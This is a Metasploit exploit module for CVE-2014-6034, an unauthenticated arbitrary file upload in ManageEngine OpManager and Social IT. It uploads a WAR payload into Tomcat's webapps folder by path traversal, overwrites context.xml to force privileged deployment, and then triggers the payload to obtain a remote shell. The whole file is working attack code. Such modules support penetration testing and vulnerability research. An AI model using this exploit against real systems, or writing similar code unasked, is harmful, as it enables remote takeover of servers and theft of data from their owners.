##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ManageEngine OpManager / Social IT Arbitrary File Upload',
      'Description' => %q{
        This module exploits a file upload vulnerability in ManageEngine OpManager and Social IT.
        The vulnerability exists in the FileCollector servlet which accepts unauthenticated
        file uploads. This module has been tested successfully on OpManager v8.8 - v11.3 and on
        version 11.0 of SocialIT for Windows and Linux.
      },
      'Author'       =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2014-6034' ],
          [ 'OSVDB', '112276' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_opmanager_socialit_it360.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Sep/110' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'OpManager v8.8 - v11.3 / Social IT Plus 11.0 Java Universal', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Sep 27 2014'))

    register_options(
      [
        Opt::RPORT(80),
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep while we wait for WAR deployment', 15]),
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri'    => normalize_uri("/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector"),
      'method' => 'GET'
    })

    # A GET request on this servlet returns "405 Method not allowed"
    if res and res.code == 405
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end


  def upload_war_and_exec(try_again, app_base)
    tomcat_path = '../../../tomcat/'
    servlet_path = '/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector'

    if try_again
      # We failed to obtain a shell. Either the target is not vulnerable or the Tomcat configuration
      # does not allow us to deploy WARs. Fix that by uploading a new context.xml file.
      # The file we are uploading has the same content apart from privileged="false" and lots of XML comments.
      # After replacing the context.xml file let's upload the WAR again.
      print_status("#{peer} - Replacing Tomcat context file")
      send_request_cgi({
        'uri' => normalize_uri(servlet_path),
        'method' => 'POST',
        'data' => %q{<?xml version='1.0' encoding='utf-8'?><Context privileged="true"><WatchedResource>WEB-INF/web.xml</WatchedResource></Context>},
        'ctype' => 'application/xml',
        'vars_get' => {
          'regionID' => tomcat_path + "conf",
          'FILENAME' => "context.xml"
        }
      })
    else
      # We need to create the upload directories before our first attempt to upload the WAR.
      print_status("#{peer} - Creating upload directories")
      bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))
      send_request_cgi({
        'uri' => normalize_uri(servlet_path),
        'method' => 'POST',
        'data' => rand_text_alphanumeric(4 + rand(32 - 4)),
        'ctype' => 'application/xml',
        'vars_get' => {
          'regionID' => "",
          'FILENAME' => bogus_file
        }
      })
      register_files_for_cleanup("state/archivedata/zip/" + bogus_file)
    end

    war_payload = payload.encoded_war({ :app_name => app_base }).to_s

    print_status("#{peer} - Uploading WAR file...")
    res = send_request_cgi({
      'uri' => normalize_uri(servlet_path),
      'method' => 'POST',
      'data' => war_payload,
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'regionID' => tomcat_path + "webapps",
        'FILENAME' => app_base + ".war"
      }
    })

    # The server either returns a 500 error or a 200 OK when the upload is successful.
    if res and (res.code == 500 or res.code == 200)
      print_status("#{peer} - Upload appears to have been successful, waiting " + datastore['SLEEP'].to_s +
      " seconds for deployment")
      sleep(datastore['SLEEP'])
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - WAR upload failed")
    end

    print_status("#{peer} - Executing payload, wait for session...")
    send_request_cgi({
      'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
      'method' => 'GET'
    })
  end


  def exploit
    app_base = rand_text_alphanumeric(4 + rand(32 - 4))

    upload_war_and_exec(false, app_base)
    register_files_for_cleanup("tomcat/webapps/" + "#{app_base}.war")

    sleep_counter = 0
    while not session_created?
      if sleep_counter == datastore['SLEEP']
        print_error("#{peer} - Failed to get a shell, let's try one more time")
        upload_war_and_exec(true, app_base)
        return
      end

      sleep(1)
      sleep_counter += 1
    end
  end
end
